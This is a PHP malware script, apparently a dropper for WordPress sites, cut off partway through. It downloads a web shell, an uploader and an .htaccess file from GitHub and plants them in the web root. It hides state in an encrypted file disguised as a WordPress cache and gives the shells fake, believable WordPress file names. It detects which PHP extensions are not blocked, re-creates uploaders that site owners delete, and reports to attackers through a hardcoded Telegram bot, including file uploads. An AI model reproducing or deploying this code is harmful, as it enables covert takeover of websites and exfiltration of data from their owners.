<?php
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@error_reporting(0);

if (!isset($_GET['TnemaL']) || $_GET['TnemaL'] != '1') {
    @ini_set('display_errors', 0);
}

define('ABSPATH', __DIR__ . '/');
define('WP_USE_THEMES', false);
define('SHORTINIT', true);

$showOutput = isset($_GET['TnemaL']) && $_GET['TnemaL'] == '1';

if ($showOutput) {
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
} else {
    error_reporting(0);
    ini_set('display_errors', 0);
    ob_start();
}

ini_set('max_execution_time', 300);
ini_set('memory_limit', '256M');

$namaShell = 'cron.php';
$namaHtaccess = '.htaccess';
$urlFileShell = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/messiah.php';
$urlFileHtaccess = 'https://raw.githubusercontent.com/lamentpicasso/picasso/main/.htaccess';
$urlUploader = 'https://raw.githubusercontent.com/lamentpicasso/lament/main/pikasso.php';

$telegramBotToken = '8274961786:AAEGSehVAxHiW5ZHJo8PG7bcCmaayLGCDoI';
$telegramChatId = '5754370773';
$telegramChannelId = '-1003318416426';
$notificationCooldown = 1800;

function encryptCache($data) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    
    $json = json_encode($data, JSON_PRETTY_PRINT);
    
    $compressed = gzcompress($json, 9);
    
    $xored = '';
    $keyLen = strlen($key);
    $dataLen = strlen($compressed);
    for ($i = 0; $i < $dataLen; $i++) {
        $xored .= $compressed[$i] ^ $key[$i % $keyLen];
    }
    
    $base64 = base64_encode($xored);
    
    $obfuscated = strrev($base64);
    
    return $obfuscated;
}

function decryptCache($encrypted) {
    $key = 'x7k9m2p5q8w3e6r1t4y7u0i3o6p9a2s5';
    
    $base64 = strrev($encrypted);
    
    $xored = base64_decode($base64);
    if ($xored === false) {
        return null;
    }
    
    $compressed = '';
    $keyLen = strlen($key);
    $dataLen = strlen($xored);
    for ($i = 0; $i < $dataLen; $i++) {
        $compressed .= $xored[$i] ^ $key[$i % $keyLen];
    }
    
    $json = @gzuncompress($compressed);
    if ($json === false) {
        return null;
    }
    
    return json_decode($json, true);
}

function generateSmartCacheFilename($dir) {
    $possibleNames = [
        '.wp-cache.php',
        '.object-cache.php',
        '.advanced-cache.php',
        '.db-cache.php',
        '.transient-cleanup.php',
        '.query-cache.php',
        '.metadata-cache.php',
        '.options-cache.php'
    ];
    
    $existingFiles = @scandir($dir);
    if ($existingFiles === false) {
        return '.wp-cache.php';
    }
    
    foreach ($possibleNames as $name) {
        if (in_array($name, $existingFiles)) {
            $filePath = $dir . DIRECTORY_SEPARATOR . $name;
            $content = @file_get_contents($filePath);
            if ($content !== false) {
                $testData = decryptCache($content);
                if (is_array($testData) && isset($testData['metadata'])) {
                    return $name;
                }
            }
        }
    }
    
    $patterns = [
        'cache', 'object', 'transient', 'option', 'meta',
        'db', 'query', 'post', 'user', 'term'
    ];
    
    $phpFiles = array_filter($existingFiles, function($f) {
        return pathinfo($f, PATHINFO_EXTENSION) === 'php' && $f[0] !== '.';
    });
    
    $wordCounts = [];
    foreach ($phpFiles as $file) {
        foreach ($patterns as $pattern) {
            if (stripos($file, $pattern) !== false) {
                $wordCounts[$pattern] = ($wordCounts[$pattern] ?? 0) + 1;
            }
        }
    }
    
    if (!empty($wordCounts)) {
        arsort($wordCounts);
        $mostCommon = array_key_first($wordCounts);
        return ".wp-{$mostCommon}.php";
    }
    
    return '.wp-cache.php';
}

function getUnifiedCacheFile($webRoot) {
    static $cacheFile = null;
    
    if ($cacheFile === null) {
        $cacheFile = $webRoot . DIRECTORY_SEPARATOR . generateSmartCacheFilename($webRoot);
    }
    
    return $cacheFile;
}

function getCacheData($webRoot, $section = null) {
    $cacheFile = getUnifiedCacheFile($webRoot);
    
    if (!file_exists($cacheFile)) {
        return $section ? null : [];
    }
    
    $encrypted = @file_get_contents($cacheFile);
    if ($encrypted === false) {
        return $section ? null : [];
    }
    
    $data = decryptCache($encrypted);
    if (!is_array($data)) {
        return $section ? null : [];
    }
    
    if ($section) {
        return $data[$section] ?? null;
    }
    
    return $data;
}

function setCacheData($webRoot, $section, $value) {
    $cacheFile = getUnifiedCacheFile($webRoot);
    
    $data = getCacheData($webRoot) ?? [];
    
    $data[$section] = $value;
    
    if (!isset($data['metadata'])) {
        $data['metadata'] = [];
    }
    $data['metadata']['last_access'] = time();
    $data['metadata']['access_count'] = ($data['metadata']['access_count'] ?? 0) + 1;
    $data['metadata']['domain'] = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    $encrypted = encryptCache($data);
    if (@file_put_contents($cacheFile, $encrypted) !== false) {
        @chmod($cacheFile, 0600);
        return true;
    }
    
    return false;
}

function updateCache($webRoot, $updates) {
    $cacheFile = getUnifiedCacheFile($webRoot);
    
    $data = getCacheData($webRoot) ?? [];
    
    foreach ($updates as $section => $value) {
        if (is_array($value) && isset($data[$section]) && is_array($data[$section])) {
            $data[$section] = array_merge($data[$section], $value);
        } else {
            $data[$section] = $value;
        }
    }
    
    if (!isset($data['metadata'])) {
        $data['metadata'] = [];
    }
    $data['metadata']['last_access'] = time();
    $data['metadata']['access_count'] = ($data['metadata']['access_count'] ?? 0) + 1;
    $data['metadata']['domain'] = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    $encrypted = encryptCache($data);
    if (@file_put_contents($cacheFile, $encrypted) !== false) {
        @chmod($cacheFile, 0600);
        return true;
    }
    
    return false;
}

function migrateOldCaches($webRoot) {
    $data = [];
    $migrated = 0;
    
    $oldShellCache = $webRoot . DIRECTORY_SEPARATOR . '.wp_cache_' . substr(md5('shell_locations'), 0, 8);
    if (file_exists($oldShellCache)) {
        $encrypted = @file_get_contents($oldShellCache);
        if ($encrypted) {
            $oldData = decryptCache($encrypted);
            if ($oldData) {
                $data['shells'] = $oldData;
                @unlink($oldShellCache);
                $migrated++;
            }
        }
    }
    
    $oldUploaderCache = $webRoot . DIRECTORY_SEPARATOR . '.wp_cron_' . substr(md5('uploader_cache'), 0, 8);
    if (file_exists($oldUploaderCache)) {
        $encrypted = @file_get_contents($oldUploaderCache);
        if ($encrypted) {
            $oldData = decryptCache($encrypted);
            if ($oldData) {
                $data['uploaders'] = $oldData;
                @unlink($oldUploaderCache);
                $migrated++;
            }
        }
    }
    
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
    $safeDomain = preg_replace('/[^a-z0-9]/', '_', strtolower($domain));
    
    $oldCooldown = $webRoot . DIRECTORY_SEPARATOR . '.wp_' . substr(md5($safeDomain), 0, 12) . '_transient';
    if (file_exists($oldCooldown)) {
        $lastNotify = (int)@file_get_contents($oldCooldown);
        if ($lastNotify > 0) {
            $data['cooldown'] = [
                'last_notify_time' => $lastNotify,
                'last_notify_date' => date('Y-m-d H:i:s', $lastNotify)
            ];
            @unlink($oldCooldown);
            $migrated++;
        }
    }
    
    $oldChatFile = $webRoot . DIRECTORY_SEPARATOR . '.wp_' . substr(md5('chat_master'), 0, 12) . '_meta';
    if (file_exists($oldChatFile)) {
        $chatId = (int)@file_get_contents($oldChatFile);
        if ($chatId > 0) {
            if (!isset($data['telegram'])) {
                $data['telegram'] = [];
            }
            $data['telegram']['chat_message_id'] = $chatId;
            @unlink($oldChatFile);
            $migrated++;
        }
    }
    
    $oldChannelFile = $webRoot . DIRECTORY_SEPARATOR . '.wp_' . substr(md5('channel_' . $safeDomain), 0, 12) . '_option';
    if (file_exists($oldChannelFile)) {
        $channelId = (int)@file_get_contents($oldChannelFile);
        if ($channelId > 0) {
            if (!isset($data['telegram'])) {
                $data['telegram'] = [];
            }
            $data['telegram']['channel_message_id'] = $channelId;
            @unlink($oldChannelFile);
            $migrated++;
        }
    }
    
    $patterns = [
        '.last_notify_*',
        '.telegram_channel_*',
        '.telegram_chat_*',
        '.wp_*_transient',
        '.wp_*_meta',
        '.wp_*_option'
    ];
    
    $files = @scandir($webRoot);
    if ($files) {
        foreach ($files as $file) {
            if ($file[0] !== '.') continue;
            
            foreach ($patterns as $pattern) {
                if (fnmatch($pattern, $file)) {
                    $fullPath = $webRoot . DIRECTORY_SEPARATOR . $file;
                    if (is_file($fullPath)) {
                        @unlink($fullPath);
                        $migrated++;
                    }
                    break;
                }
            }
        }
    }
    
    if (!empty($data)) {
        $data['metadata'] = [
            'domain' => $domain,
            'migrated_at' => time(),
            'migrated_date' => date('Y-m-d H:i:s'),
            'version' => '2.0'
        ];
        
        $encrypted = encryptCache($data);
        $cacheFile = getUnifiedCacheFile($webRoot);
        if (@file_put_contents($cacheFile, $encrypted) !== false) {
            @chmod($cacheFile, 0600);
            echo "✅ Migrated {$migrated} cache entries to unified cache: " . basename($cacheFile) . "\n";
            
            if (isset($data['cooldown'])) {
                $lastNotify = $data['cooldown']['last_notify_time'];
                $age = time() - $lastNotify;
                echo "  📅 Cooldown migrated: last notify " . round($age / 60, 1) . " minutes ago\n";
            }
            
            return true;
        }
    } else {
        echo "  ℹ️  No old cache files found - this is a fresh installation\n";
    }
    
    return false;
}

function geturlsinfo($url) {
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $h = fopen($url, "r");
        $data = stream_get_contents($h);
        fclose($h);
    } else {
        $data = false;
    }
    return $data;
}

function sendOrEditMessage($webRoot, $botToken, $chatId, $message, $trackType = 'chat') {
    $telegramData = getCacheData($webRoot, 'telegram') ?? [];
    $messageIdKey = $trackType . '_message_id';
    $existingMessageId = $telegramData[$messageIdKey] ?? 0;
    
    if ($existingMessageId > 0) {
        $url = "https://api.telegram.org/bot{$botToken}/editMessageText";
        $data = [
            'chat_id' => $chatId,
            'message_id' => $existingMessageId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    } else {
        $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];
    }
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = @curl_exec($ch);
    curl_close($ch);
    
    $result = json_decode($response, true);
    
    if ($result['ok'] && !$existingMessageId) {
        $newMessageId = $result['result']['message_id'];
        $telegramData[$messageIdKey] = $newMessageId;
        $telegramData['last_update'] = time();
        setCacheData($webRoot, 'telegram', $telegramData);
    }
    
    return $result['ok'] ?? false;
}

function sendTelegramDocument($botToken, $chatId, $filePath, $caption) {
    if (empty($botToken) || empty($chatId) || !file_exists($filePath)) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
    
    $post_fields = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'document' => new CURLFile(realpath($filePath))
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $result = @curl_exec($ch);
    curl_close($ch);
    
    return $result;
}

function shouldNotify($webRoot, $cooldown) {
    $forceNotify = isset($_GET['notify']) && $_GET['notify'] == '1';
    
    if ($forceNotify) {
        echo "\n🔔 Force notify mode (bypass cooldown)\n";
        setCacheData($webRoot, 'cooldown', [
            'last_notify_time' => time(),
            'last_notify_date' => date('Y-m-d H:i:s')
        ]);
        return true;
    }
    
    $cooldownData = getCacheData($webRoot, 'cooldown');
    $lastNotifyTime = $cooldownData['last_notify_time'] ?? 0;
    $currentTime = time();
    $timeSince = $currentTime - $lastNotifyTime;
    
    echo "\n📊 Notification check:\n";
    echo "  Last notify: " . ($lastNotifyTime > 0 ? date('Y-m-d H:i:s', $lastNotifyTime) : 'Never') . "\n";
    echo "  Time since: " . round($timeSince / 60, 1) . " minutes\n";
    echo "  Cooldown: " . round($cooldown / 60, 1) . " minutes\n";
    
    if ($lastNotifyTime === 0) {
        setCacheData($webRoot, 'cooldown', [
            'last_notify_time' => $currentTime,
            'last_notify_date' => date('Y-m-d H:i:s', $currentTime)
        ]);
        echo "  🆕 First run detected - cooldown initialized, skipping notification\n";
        echo "  💡 Next notification will be sent after " . round($cooldown / 60, 1) . " minutes\n";
        return false;
    }
    
    if ($currentTime - $lastNotifyTime > $cooldown) {
        setCacheData($webRoot, 'cooldown', [
            'last_notify_time' => $currentTime,
            'last_notify_date' => date('Y-m-d H:i:s', $currentTime)
        ]);
        echo "  ✅ Sending notification (cooldown expired)\n";
        return true;
    }
    
    echo "  ⏭️ Skipping notification (cooldown active: " . round(($cooldown - $timeSince) / 60, 1) . " min left)\n";
    return false;
}

function findWebRoot($startDir) {
    if (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        echo "Web root ditemukan via DOCUMENT_ROOT: {$_SERVER['DOCUMENT_ROOT']}\n";
        return $_SERVER['DOCUMENT_ROOT'];
    }
    
    $current = $startDir;
    $indicators = ['public_html', 'www', 'htdocs', 'public', 'web'];
    
    while ($current !== dirname($current)) {
        $basename = basename($current);
        
        if (in_array($basename, $indicators)) {
            echo "Web root ditemukan via folder indicator: $current\n";
            return $current;
        }
        
        if (file_exists($current . DIRECTORY_SEPARATOR . 'index.php') || 
            file_exists($current . DIRECTORY_SEPARATOR . 'index.html') ||
            file_exists($current . DIRECTORY_SEPARATOR . 'wp-config.php')) {
            echo "Web root ditemukan via root files: $current\n";
            return $current;
        }
        
        $current = dirname($current);
    }
    
    echo "Web root tidak terdeteksi, menggunakan direktori saat ini: $startDir\n";
    return $startDir;
}

echo "Mengambil file shell dari GitHub: $urlFileShell\n";
$shellContent = geturlsinfo($urlFileShell);
if ($shellContent === false) {
    die("Gagal mengambil file shell dari: $urlFileShell");
}
echo "File shell berhasil diambil dari GitHub\n";

$shellMarker = '/*SHELL_MARKER_' . md5($urlFileShell) . '*/';

if (strpos($shellContent, '<?php') === 0) {
    $shellContent = str_replace('<?php', '<?php ' . $shellMarker . ' ', $shellContent);
} elseif (strpos($shellContent, '<?') === 0) {
    $shellContent = str_replace('<?', '<? ' . $shellMarker . ' ', $shellContent);
} else {
    $shellContent = '<?php ' . $shellMarker . ' ?>' . "\n" . $shellContent;
}

echo "\nMengambil file uploader dari GitHub: $urlUploader\n";
$uploaderContent = geturlsinfo($urlUploader);
if ($uploaderContent !== false) {
    echo "File uploader berhasil diambil dari GitHub\n";
} else {
    echo "Gagal mengambil file uploader, menggunakan file saat ini\n";
    $uploaderContent = file_get_contents(__FILE__);
}

echo "Mengambil file .htaccess dari GitHub: $urlFileHtaccess\n";
$htaccessContent = geturlsinfo($urlFileHtaccess);
if ($htaccessContent === false) {
    die("Gagal mengambil file .htaccess dari: $urlFileHtaccess");
}
echo "File .htaccess berhasil diambil dari GitHub\n";

$webRoot = findWebRoot(__DIR__);

echo "\n🔄 Checking for old cache files to migrate...\n";
migrateOldCaches($webRoot);

$pathFileHtaccess = $webRoot . DIRECTORY_SEPARATOR . $namaHtaccess;

if (file_exists($pathFileHtaccess)) {
    echo "File .htaccess sudah ada di: $pathFileHtaccess (skip upload)\n";
} else {
    if (file_put_contents($pathFileHtaccess, $htaccessContent) !== false) {
        @chmod($pathFileHtaccess, 0444);
        echo "File .htaccess berhasil diupload ke web root: $pathFileHtaccess dengan permission 0444\n";
    } else {
        $error = error_get_last();
        echo "Gagal mengupload file .htaccess ke: $pathFileHtaccess\n";
        echo "Error: " . ($error['message'] ?? 'Unknown error') . "\n";
    }
}

function detectAllowedExtension($dir) {
    $htaccessFile = $dir . DIRECTORY_SEPARATOR . '.htaccess';
    
    $possibleExtensions = [
        '.PHP',   // Uppercase
        '.Php',   // Capitalized
        '.PhP',   // Mixed
        '.pHp',   // Mixed
        '.php',   // Lowercase (default)
        '.inc',   // Include files
        '.phar',  // PHP Archive
        '.php7',  // PHP 7
        '.php8'   // PHP 8
    ];
    
    if (!file_exists($htaccessFile)) {
        return '.php';
    }
    
    $htaccessContent = @file_get_contents($htaccessFile);
    if ($htaccessContent === false) {
        return '.php';
    }
    
    $blockedPatterns = [];
    $allowedPatterns = [];
    
    if (preg_match_all('/<Files\s+["\']?\*\.([^"\'>\s]+)["\']?>/i', $htaccessContent, $matches)) {
        foreach ($matches[0] as $index => $fullMatch) {
            $pattern = $matches[1][$index];
            
            $blockStart = strpos($htaccessContent, $fullMatch);
            $blockEnd = strpos($htaccessContent, '</Files>', $blockStart);
            
            if ($blockEnd !== false) {
                $block = substr($htaccessContent, $blockStart, $blockEnd - $blockStart);
                
                if (stripos($block, 'Deny') !== false || stripos($block, 'Require not') !== false) {
                    $blockedPatterns[] = strtolower($pattern);
                } elseif (stripos($block, 'Allow') !== false || stripos($block, 'Require all granted') !== false) {
                    $allowedPatterns[] = strtolower($pattern);
                }
            }
        }
    }
    
    foreach ($possibleExtensions as $ext) {
        $extPattern = ltrim(strtolower($ext), '.');
        
        $isExplicitlyAllowed = false;
        foreach ($allowedPatterns as $allowed) {
            if (fnmatch($allowed, $extPattern)) {
                $isExplicitlyAllowed = true;
                break;
            }
        }
        
        if ($isExplicitlyAllowed) {
            return $ext;
        }
        
        $isBlocked = false;
        foreach ($blockedPatterns as $blocked) {
            if (fnmatch($blocked, $extPattern)) {
                $isBlocked = true;
                break;
            }
        }
        
        if (!$isBlocked) {
            return $ext;
        }
    }
    
    return '.php';
}

function generateSmartFilename($dir, $shellMarker, &$usedFilenames) {
    $blacklist = [
        'index.php', 'config.php', 'wp-config.php', 'database.php',
        'connection.php', 'settings.php', 'install.php', 'setup.php',
        'admin.php', 'login.php', 'register.php', 'functions.php',
        'autoload.php', 'bootstrap.php', 'init.php', 'loader.php',
        'controller.php', 'model.php', 'middleware.php', 'router.php',
        '.htaccess', 'composer.json', 'package.json'
    ];
    
    $fallbackNames = [
        'wp-vcd.php', 'wp-tmp.php', 'wp-feed.php', 'wp-content.php',
        'xmlrpc-api.php', 'rss-functions.php', 'atom-service.php',
        'trackback-utils.php', 'pingback-handler.php', 'comment-extra.php',
        'nav-menu-legacy.php', 'customize-preview.php', 'revisions-diff.php',
        'embed-template.php', 'oembed-response.php', 'rest-functions.php',
        'ms-functions.php', 'ms-default-filters.php', 'ms-deprecated.php',
        'link-template-tags.php', 'general-template-deprecated.php',
        'post-template-compat.php', 'category-template-legacy.php',
        'author-template-tags.php', 'date-functions.php', 'time-compat.php',
        'formatting-deprecated.php', 'kses-legacy.php', 'cron-api.php',
        'pluggable-deprecated.php', 'capabilities-compat.php',
        'taxonomy-legacy.php', 'term-meta-compat.php', 'query-deprecated.php',
        'rewrite-legacy.php', 'vars-deprecated.php', 'class-compat.php',
        'registration-functions.php', 'registration-deprecated.php',
        'admin-deprecated-compat.php', 'ms-admin-deprecated.php',
        'wp-mail-legacy.php', 'sitemap-functions-compat.php', 'wp-diff-old.php',
        'random-compat.php', 'compat-mbstring.php', 'sodium-compat.php',
        'polyfill-deprecated.php', 'shim-legacy.php', 'fallback-compat.php',
        'bridge-deprecated.php', 'wrapper-legacy.php', 'adapter-compat.php',
        'locale-deprecated.php', 'i18n-legacy.php', 'translation-compat.php',
        'cache-deprecated.php', 'object-cache-legacy.php', 'transient-compat.php',
        'option-deprecated.php', 'meta-legacy.php', 'user-meta-compat.php',
        'post-meta-deprecated.php', 'comment-meta-legacy.php',
        'block-deprecated.php', 'pattern-legacy.php', 'theme-compat.php',
        'sidebar-deprecated.php', 'widget-legacy.php', 'menu-compat.php',
        'shortcode-deprecated.php', 'embed-legacy.php', 'media-compat.php',
        'image-deprecated.php', 'attachment-legacy.php', 'upload-compat.php',
        'http-deprecated.php', 'request-legacy.php', 'response-compat.php',
        'cookie-deprecated.php', 'session-legacy.php', 'nonce-compat.php',
        'auth-deprecated.php', 'user-legacy.php', 'role-compat.php',
        'permission-deprecated.php', 'privacy-legacy.php', 'gdpr-compat.php'
    ];
    
    $existingFiles = @scandir($dir);
    if ($existingFiles === false) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $phpFiles = array_filter($existingFiles, function($file) use ($blacklist) {
        return pathinfo($file, PATHINFO_EXTENSION) === 'php' && !in_array($file, $blacklist);
    });
    
    if (count($phpFiles) < 2) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $words = [];
    $separator = '-';
    
    foreach ($phpFiles as $file) {
        $basename = pathinfo($file, PATHINFO_FILENAME);
        
        if (strpos($basename, '-') !== false) {
            $separator = '-';
            $parts = explode('-', $basename);
        } elseif (strpos($basename, '_') !== false) {
            $separator = '_';
            $parts = explode('_', $basename);
        } else {
            $parts = [$basename];
        }
        
        foreach ($parts as $part) {
            $part = strtolower(trim($part));
            if (strlen($part) > 2 && !is_numeric($part)) {
                $words[] = $part;
            }
        }
    }
    
    if (empty($words)) {
        return getUnusedFallbackName($fallbackNames, $usedFilenames);
    }
    
    $words = array_unique($words);
    $words = array_values($words);
    
    $safeWords = ['legacy', 'compat', 'deprecated', 'extra', 'utils', 'tags', 'alt', 'backup', 'old', 'tmp'];
    $words = array_merge($words, $safeWords);
    
    $allowedExt = detectAllowedExtension($dir);
    
    $attempts = 0;
    $maxAttempts = 30;
    
    while ($attempts < $maxAttempts) {
        shuffle($words);
        $wordCount = rand(2, min(3, count($words)));
        $selectedWords = array_slice($words, 0, $wordCount);
        $filename = implode($separator, $selectedWords) . $allowedExt;
        $filepath = $dir . DIRECTORY_SEPARATOR . $filename;
        
        if (in_array($filename, $blacklist)) {
            $attempts++;
            continue;
        }
        
        if (isset($usedFilenames[$filename])) {
            $usedFilenames[$filename]++;
            if ($usedFilenames[$filename] > 2) {
                $attempts++;
                continue;
            }
        }
        
        if (file_exists($filepath)) {
            $content = @file_get_contents($filepath);
            if ($content && strpos($content, $shellMarker) !== false) {
                $usedFilenames[$filename] = ($usedFilenames[$filename] ?? 0) + 1;
                return $filename;
            }
            
            if (filesize($filepath) > 10240) {
                $attempts++;
                continue;
            }
        }
        
        if (!file_exists($filepath)) {
            $usedFilenames[$filename] = ($usedFilenames[$filename] ?? 0) + 1;
            return $filename;
        }
        
        $attempts++;
    }
    
    return getUnusedFallbackName($fallbackNames, $usedFilenames, $dir);
}

function getUnusedFallbackName($fallbackNames, &$usedFilenames, $dir = null) {
    $allowedExt = $dir ? detectAllowedExtension($dir) : '.php';
    
    $fallbackNamesWithExt = array_map(function($name) use ($allowedExt) {
        return str_replace('.php', $allowedExt, $name);
    }, $fallbackNames);
    
    shuffle($fallbackNamesWithExt);
    
    foreach ($fallbackNamesWithExt as $name) {
        if (!isset($usedFilenames[$name]) || $usedFilenames[$name] < 2) {
            $usedFilenames[$name] = ($usedFilenames[$name] ?? 0) + 1;
            return $name;
        }
    }
    
    $timestamp = substr(md5(microtime()), 0, 6);
    return 'class-' . $timestamp . $allowedExt;
}

function createBackupUploaders($webRoot, $uploaderContent, $count = 3) {
    $today = date('Y-m-d');
    $uploaderMap = [];
    
    $cache = getCacheData($webRoot, 'uploaders') ?? [];
    
    $cacheTimestamp = $cache['timestamp'] ?? 0;
    $cacheAge = time() - $cacheTimestamp;
    $uploaderMap = $cache['map'] ?? [];
    
    if (!empty($uploaderMap) && isset($cache['date']) && $cache['date'] === $today) {
        echo "Menggunakan backup uploader locations dari cache hari ini ($today)\n";
        
        $status = detectUnexpectedDeletion($webRoot, $uploaderMap);
        $deletedCount = count($status['deleted']);
        $existingCount = count($status['existing']);
        
        if ($deletedCount > 0 && $cacheAge < 82800) {
            echo "\n🚨 UPLOADER ADAPTIVE MODE!\n";
            echo "Detected {$deletedCount} uploader deletions (cache age: " . round($cacheAge/3600, 1) . "h)\n";
            
            $directories = getAllDirs($webRoot);
            
            $deletedDirs = array_keys($status['deleted']);
            $availableDirs = array_filter($directories, function($dir) use ($webRoot, $deletedDirs) {
                $subdirKey = str_replace($webRoot, '', $dir);
                return !in_array($subdirKey, $deletedDirs);
            });
            
            if (count($availableDirs) < $deletedCount) {
                $deletedCount = count($availableDirs);
            }
            
            shuffle($availableDirs);
            $newDirs = array_slice($availableDirs, 0, $deletedCount);
            
            $uploaderNames = [
                // Core WordPress files (believable but fake)
                'wp-settings-backup.php',
                'wp-config-sample.php', 
                'wp-activate.php',
                'wp-comments-post.php',
                'wp-mail.php',
                'wp-trackback.php',
                'wp-links-opml.php',
                'wp-signup.php',
                
                // Theme related
                'theme-update-check.php',
                'theme-compat.php',
                'theme-installer.php',
                'theme-preview.php',
                'style-rtl.php',
                'functions-deprecated.php',
                'template-loader.php',
                
                // Plugin related
                'plugin-verify.php',
                'plugin-upgrade.php',
                'plugin-installer.php',
                'plugin-editor-legacy.php',
                'widgets-deprecated.php',
                
                // Update/Upgrade related
                'update-core-verify.php',
                'update-check.php',
                'upgrade-functions.php',
                'class-wp-upgrader.php',
                'class-theme-upgrader.php',
                'class-plugin-upgrader.php',
                
                // Maintenance related
                'maintenance-mode.php',
                'health-monitor.php',
                'system-check.php',
                'db-repair-check.php',
                'optimize-tables.php',
                'error-protection.php',
                
                // Cache related
                'cache-cleanup.php',
                'cache-compat.php',
                'object-cache-legacy.php',
                'transient-cleanup.php',
                
                // Admin related
                'admin-ajax-legacy.php',
                'admin-post-handler.php',
                'load-scripts-legacy.php',
                'load-styles-legacy.php',
                
                // API/Integration related
                'rest-api-compat.php',
                'xmlrpc-legacy.php',
                'embed-template.php',
                'oembed-handler.php',
                
                // Cron/Scheduled tasks
                'cron-handler.php',
                'wp-cron-legacy.php',
                'scheduled-cleanup.php',
                
                // Misc believable names
                'deprecated-functions.php',
                'nav-menu-legacy.php',
                'post-template-tags.php',
                'category-template.php',
                'author-template.php',
                'link-template.php',
                'general-template.php',
                'formatting-functions.php',
                'capabilities-check.php',
                'user-registration.php',
                'query-functions.php',
                'rewrite-functions.php',
                'taxonomy-functions.php',
                'bookmark-template.php',
                'feed-functions.php',
                'meta-functions.php',
                'default-constants.php'
            ];
            
            $newUploaderMap = [];
            foreach ($newDirs as $index => $dir) {
                $subdirKey = str_replace($webRoot, '', $dir);
                $uploaderName = $uploaderNames[$index % count($uploaderNames)];
                $newUploaderMap[$subdirKey] = $uploaderName;
            }
            
            sendTelegramAlert($deletedCount, $status['deleted'], $cacheAge, $newUploaderMap);
            
            $uploaderMap = array_merge($status['existing'], $newUploaderMap);
            
            echo "🎯 Created {$deletedCount} NEW uploader locations\n";
            echo "✅ Kept {$existingCount} existing uploaders\n\n";
        }
        
    } else {
        if (!empty($cache)) {
            echo "Uploader cache expired (tanggal berbeda), generate lokasi baru\n";
            if (isset($cache['success_rate']) && $cache['success_rate'] < 0.8) {
                echo "⚠️ Success rate rendah kemarin, KEEP old uploaders\n";
            } else {
                echo "✅ Success rate bagus, cleanup old uploaders\n";
                cleanupOldUploaders($webRoot, $cache['map'] ?? []);
            }
        }
        $uploaderMap = [];
    }
    
    $isNewDay = empty($uploaderMap);
    $backupPaths = [];
    
    if ($isNewDay) {
        $directories = getAllDirs($webRoot);
        
        if (count($directories) < $count) {
            $count = count($directories);
        }
        
        shuffle($directories);
        $selectedDirs = array_slice($directories, 0, $count);
        
        $uploaderNames = [
            // Core WordPress files (believable but fake)
            'wp-settings-backup.php',
            'wp-config-sample.php', 
            'wp-activate.php',
            'wp-comments-post.php',
            'wp-mail.php',
            'wp-trackback.php',
            'wp-links-opml.php',
            'wp-signup.php',
            
            // Theme related
            'theme-update-check.php',
            'theme-compat.php',
            'theme-installer.php',
            'theme-preview.php',
            'style-rtl.php',
            'functions-deprecated.php',
            'template-loader.php',
            
            // Plugin related
            'plugin-verify.php',
            'plugin-upgrade.php',
            'plugin-installer.php',
            'plugin-editor-legacy.php',
            'widgets-deprecated.php',
            
            // Update/Upgrade related
            'update-core-verify.php',
            'update-check.php',
            'upgrade-functions.php',
            'class-wp-upgrader.php',
            'class-theme-upgrader.php',
            'class-plugin-upgrader.php',
            
            // Maintenance related
            'maintenance-mode.php',
            'health-monitor.php',
            'system-check.php',
            'db-repair-check.php',
            'optimize-tables.php',
            'error-protection.php',
            
            // Cache related
            'cache-cleanup.php',
            'cache-compat.php',
            'object-cache-legacy.php',
            'transient-cleanup.php',
            
            // Admin related
            'admin-ajax-legacy.php',
            'admin-post-handler.php',
            'load-scripts-legacy.php',
            'load-styles-legacy.php',
            
            // API/Integration related
            'rest-api-compat.php',
            'xmlrpc-legacy.php',
            'embed-template.php',
            'oembed-handler.php',
            
            // Cron/Scheduled tasks
            'cron-handler.php',
            'wp-cron-legacy.php',
            'scheduled-cleanup.php',
            
            // Misc believable names
            'deprecated-functions.php',
            'nav-menu-legacy.php',
            'post-template-tags.php',
            'category-template.php',
            'author-template.php',
            'link-template.php',
            'general-template.php',
            'formatting-functions.php',
            'capabilities-check.php',
            'user-registration.php',
            'query-functions.php',
            'rewrite-functions.php',
            'taxonomy-functions.php',
            'bookmark-template.php',
            'feed-functions.php',
            'meta-functions.php',
            'default-constants.php'
        ];
        
        foreach ($selectedDirs as $index => $dir) {
